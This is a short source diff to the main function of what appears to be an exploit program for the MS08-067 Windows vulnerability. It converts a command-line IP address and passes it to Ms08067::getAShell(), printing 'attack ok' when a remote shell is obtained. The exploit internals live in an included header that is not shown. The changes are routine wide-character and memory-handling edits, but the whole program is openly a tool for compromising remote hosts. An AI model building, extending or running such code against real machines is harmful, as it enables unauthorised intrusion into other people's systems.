@@ -5,11 +5,10 @@
 #include <stdlib.h>
 #include <crtdbg.h>
 
-#include <tchar.h>
-
+#include <tstring.h>
 #include <ms08-067.h>
 
-int _tmain(int argc, _TCHAR* argv[])
+int wmain(int argc, wchar_t* argv[])
 {
 	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
 
@@ -20,8 +19,8 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2,2), &wsaData);
-
-	if (Ms08067::getAShell(argv[1])) {
+	char *ip = wToc(argv[1]);
+	if (Ms08067::getAShell(ip)) {
 		printf("attack ok\n");
 		//Tcp tcp = Ms08067::getCommandSocket(argv[1]);
 		//while (tcp.selectread(5)) {
@@ -29,6 +28,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		//}
 
 	}
+	delete[] ip;
 	return 0;
 }
 
